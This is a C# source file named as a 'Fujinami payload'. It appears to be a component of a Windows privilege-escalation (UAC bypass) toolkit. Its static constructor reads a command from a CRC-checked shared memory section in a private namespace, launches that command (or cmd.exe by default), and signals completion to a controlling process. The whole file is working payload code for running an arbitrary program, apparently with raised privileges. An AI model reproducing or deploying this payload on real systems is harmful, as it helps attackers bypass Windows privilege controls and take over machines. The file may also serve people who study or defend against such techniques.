/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018
*
*  TITLE:       FUJINAMI.CS
*
*  VERSION:     3.10
*
*  DATE:        13 Nov 2018
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

//
// Fujinami payload code
//
// Read registry value with custom parameter and execute it.
//
namespace Fujinami
{
    public class EntryPoint
    {
        /// <summary>
        /// Program entry point.
        /// </summary>
        static EntryPoint()
        {
            try
            {
                Debug.Write("Ready, fire!");

                bool bSharedParamsReadOk = false;
                IntPtr BoundaryDescriptor = NativeMethods.CreateBoundaryDescriptorW("ArisuTsuberuku", 0);
                if (BoundaryDescriptor == IntPtr.Zero)
                    return;

                IntPtr domainSid = IntPtr.Zero;
                IntPtr pSid = IntPtr.Zero;
                uint cbSid = 0;

                NativeMethods.CreateWellKnownSid(NativeMethods.WELL_KNOWN_SID_TYPE.WinWorldSid, domainSid, pSid, ref cbSid);

                pSid = Marshal.AllocHGlobal(Convert.ToInt32(cbSid));

                if (!NativeMethods.CreateWellKnownSid(
                        NativeMethods.WELL_KNOWN_SID_TYPE.WinWorldSid,
                        domainSid,
                        pSid,
                        ref cbSid))
                {
                    return;
                }

                if (!NativeMethods.AddSIDToBoundaryDescriptor(ref BoundaryDescriptor, pSid))
                    return;

                IntPtr hPrivateNamespace = NativeMethods.OpenPrivateNamespaceW(BoundaryDescriptor, "AkagiIsoSpace");

                Marshal.FreeHGlobal(pSid);
                NativeMethods.DeleteBoundaryDescriptor(BoundaryDescriptor);

                if (hPrivateNamespace == IntPtr.Zero)
                    return;

                IntPtr hSection = IntPtr.Zero;

                NativeMethods.OBJECT_ATTRIBUTES oa = new NativeMethods.OBJECT_ATTRIBUTES(
                    "AkagiSharedSection",
                    NativeMethods.ObjectFlags.CaseInsensitive,
                    hPrivateNamespace);

                NativeMethods.NtStatus Status = NativeMethods.NtOpenSection(
                    out hSection,
                    NativeMethods.SectionAccess.MapRead,
                    ref oa);

                if (NativeMethods.IsSuccess(Status))
                {
                    IntPtr BaseAddress = IntPtr.Zero;
                    IntPtr ViewSize = new IntPtr(0x1000);
                    long sectionOffset = 0;

                    Status = NativeMethods.NtMapViewOfSection(
                        hSection,
                        NativeMethods.GetCurrentProcess(),
                        ref BaseAddress,
                        IntPtr.Zero,
                        new IntPtr(0x1000),
                        ref sectionOffset,
                        ref ViewSize,
                        NativeMethods.SectionInherit.ViewUnmap,
                        NativeMethods.MemoryFlags.TopDown,
                        NativeMethods.MemoryProtection.ReadOnly);

                    if (NativeMethods.IsSuccess(Status))
                    {
                        Int32 StructSize = Marshal.SizeOf(typeof(NativeMethods.SHARED_PARAMS));
                        byte[] rawData = new byte[StructSize];
                        Marshal.Copy(BaseAddress, rawData, 0, StructSize);

                        NativeMethods.SHARED_PARAMS SharedParams = (NativeMethods.SHARED_PARAMS)
                            Marshal.PtrToStructure(
                                Marshal.UnsafeAddrOfPinnedArrayElement(rawData, 0),
                                typeof(NativeMethods.SHARED_PARAMS));

                        NativeMethods.NtUnmapViewOfSection(hSection, BaseAddress);

                        var Crc32 = SharedParams.Crc32;
                        SharedParams.Crc32 = 0;

                        var StructPtr = Marshal.AllocHGlobal(StructSize);

                        Marshal.StructureToPtr(SharedParams, StructPtr, false);

                        bSharedParamsReadOk = (Crc32 == NativeMethods.RtlComputeCrc32(0, StructPtr, Convert.ToUInt32(StructSize)));

                        Marshal.FreeHGlobal(StructPtr);

                        var PayloadToExecute = string.Empty;

                        if (bSharedParamsReadOk)
                        {
                            PayloadToExecute = SharedParams.szParameter;
                        }

                        if (PayloadToExecute == string.Empty)
                            PayloadToExecute = "cmd.exe";

                        Process.Start(PayloadToExecute);

                        if (bSharedParamsReadOk)
                        {
                            IntPtr hEvent = IntPtr.Zero;

                            NativeMethods.OBJECT_ATTRIBUTES oae = new NativeMethods.OBJECT_ATTRIBUTES(
                                SharedParams.szSignalObject,
                                NativeMethods.ObjectFlags.CaseInsensitive,
                                hPrivateNamespace);

                            Status = NativeMethods.NtOpenEvent(out hEvent, NativeMethods.EventAccess.AllAccess, ref oae);
                            if (NativeMethods.IsSuccess(Status))
                            {
                                int prev = 0;
                                NativeMethods.NtSetEvent(hEvent, out prev);
                                NativeMethods.NtClose(hEvent);
                            }
                        }
                    }
                    NativeMethods.NtClose(hSection);
                }
                NativeMethods.ClosePrivateNamespace(hPrivateNamespace, 0);
            }
            catch
            {
                Environment.Exit(0);
            }

            Debug.Write("Bye!");

            Environment.Exit(0);
        }
    }
}
